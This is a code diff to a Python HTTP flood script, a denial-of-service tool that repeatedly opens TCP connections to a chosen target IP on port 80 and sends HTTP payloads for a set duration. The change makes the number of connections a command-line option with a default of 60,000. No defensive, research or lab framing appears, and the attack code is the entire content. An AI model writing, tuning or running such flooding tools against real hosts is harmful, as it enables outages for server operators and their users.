@@ -32,18 +32,16 @@ def build_http_payload():
            "\r\n".join(headers) + "\r\n\r\n" + body
 
 
-def http_flood(target_ip, duration):
+def http_flood(target_ip, duration, total_flows):
 
-    target_flows = 60000
     flows_created = 0
     start = time.time()
 
-    while flows_created < target_flows and (time.time() - start) < duration:
+    while flows_created < total_flows and (time.time() - start) < duration:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
 
-            # Kernel chooses source IP + port automatically
             s.connect((target_ip, 80))
 
             payload = build_http_payload().encode()
@@ -64,8 +62,14 @@ def http_flood(target_ip, duration):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: http_flood.py <target_ip> <duration>")
+    if len(sys.argv) < 3:
+        print("Usage: http_flood.py <target_ip> <duration> [total_flows]")
         sys.exit(1)
 
-    http_flood(sys.argv[1], int(sys.argv[2]))
+    target_ip = sys.argv[1]
+    duration = int(sys.argv[2])
+
+    # default total flows = 60000
+    total_flows = int(sys.argv[3]) if len(sys.argv) > 3 else 60000
+
+    http_flood(target_ip, duration, total_flows)
